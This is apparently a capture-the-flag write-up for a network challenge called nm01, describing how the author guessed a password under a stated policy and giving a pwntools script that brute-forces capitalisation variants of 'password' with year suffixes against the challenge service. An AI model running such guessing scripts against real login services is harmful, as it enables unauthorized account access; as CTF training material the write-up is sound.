# Network - nm01
## Description
```
Access the network service at 1-nm01.bootupctf.net port: 7906 and find a way to get the flag. Note: The password policy requires at least one capital letter, and four digits. The policy is also to force a password change every year.
```
From the description, my first attempts revolved around trying every word from rockyou, capitalized, with `2024` appended at the end. When this didn't work, decided to keep it basic and try variations on `password`. Built a python script to try every possible uppper and lower case combination of the word, with the year appended. This again failed.
Finally got an external push that yearly changes doesn't necessarily mean that the year would be `2024`, adapted the script to try all years from 1990, and finally got a hit:

```
from pwn import *
from itertools import *

pw = "password"
def uppi(text,pos):
    t = list(text)
    for p in pos:
        t[p] = t[p].upper()
    return "".join(t)

stuff = [*range(len(pw))]
for L in range(1,len(stuff) + 1):
    for subset in combinations(stuff, L):
        for number in range(1990,2024):
            rep = list(subset)
            #print(rep)
            #conn = remote('1-nm01.bootupctf.net',7906,level='debug')
            conn = remote('1-nm01.bootupctf.net',7906,level='error')
            conn.recvline()
            pwt = uppi(pw,rep)+f'{number:04}'
            conn.sendline(pwt)
            ans = conn.recvline()
            if ans != b'Authentication failure. Goodbye.\n':
                ans = conn.recvline()
                ans = conn.recvline()
                print([pwt,ans])
            #print([pwt,ans])
            conn.close()
```
